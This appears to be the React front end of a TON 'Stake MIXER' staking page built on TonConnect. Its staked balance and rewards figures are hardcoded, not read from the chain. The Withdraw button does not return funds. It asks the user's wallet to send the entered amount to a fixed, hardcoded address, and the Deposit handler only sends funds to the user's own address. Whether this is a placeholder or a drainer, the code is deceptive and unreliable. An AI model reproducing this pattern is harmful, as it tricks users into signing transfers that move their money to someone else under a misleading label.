import React, { useState } from 'react';
import { TonConnectButton, useTonAddress,useTonConnectUI  } from '@tonconnect/ui-react';

import './App.css';

function App() {
    const [tonConnectUI] = useTonConnectUI();
  const [stakedBalance, setStakedBalance] = useState(5000);
  const [unclaimedEarnings, setUnclaimedEarnings] = useState(1);
  const [depositAmount, setDepositAmount] = useState('');
  const [withdrawalAmount, setWithdrawalAmount] = useState('');
  const walletAddress = useTonAddress();


  const handleDeposit = async () => {
    if (depositAmount > 0) {
        const transaction = {
            messages: [
                {
                    address: walletAddress, 
                    amount: depositAmount 
                }
            ]
        
        }
        //I made here a simple tx change to deposit mixer tx
      try {
        const amount = parseFloat(depositAmount);
      
        await tonConnectUI.sendTransaction(transaction);
        setStakedBalance(stakedBalance + amount);
        setDepositAmount('');
      } catch (error) {
        console.error('Transaction failed:', error);
     
      }
    }
  };



  const handleWithdraw = async() => {
    if (withdrawalAmount > 0 && withdrawalAmount <= stakedBalance) {
      const transaction = {
        messages: [
            {
                address: "0:412410771DA82CBA306A55FA9E0D43C9D245E38133CB58F1457DFB8D5CD8892F", 
                amount: withdrawalAmount 
            }
        ]
    
    }
    //I made here a simple tx change to widraw mixer tx
  try {
  
    await tonConnectUI.sendTransaction(transaction);
   
  } catch (error) {
    console.error('Transaction failed:', error);
 
  }
  };};

  const handleClaimRewards = () => {
    setUnclaimedEarnings(1);
  };

  return (
    <div className="app-container">
    
      <header>
        <div className="connect-btn">
          <TonConnectButton />
        </div>
      </header>

    
      <div className="staking-card">
        <h1>Stake MIXER</h1>

      
        <div className="staked-info">
          <div className="info-box">
            <h3>Staked Balance</h3>
            <p>{stakedBalance} MIXER</p>
          </div>
          <div className="info-box">
            <h3>Unclaimed Rewards</h3>
            <p>{unclaimedEarnings} TON</p>
          </div>
        </div>

        {unclaimedEarnings > 0 && (
          <div className="claim-rewards-section">
            <button onClick={handleClaimRewards}>Claim Rewards</button>
          </div>
        )}
        <div className="deposit-section">
          <h3>Deposit MIXER</h3>
          <input
            type="number"
            value={depositAmount}
            placeholder="Enter amount"
            onChange={(e) => setDepositAmount(e.target.value)}
          />
          <button onClick={handleDeposit}>Deposit</button>
        </div>

        {stakedBalance > 0 && (
          <div className="withdraw-section">
            <h3>Withdraw MIXER</h3>
            <input
              type="number"
              value={withdrawalAmount}
              placeholder="Enter amount"
              onChange={(e) => setWithdrawalAmount(e.target.value)}
            />
            <button onClick={handleWithdraw}>Withdraw</button>
          </div>
        )}

        
      
      </div>
    </div>
  );
}

export default App;
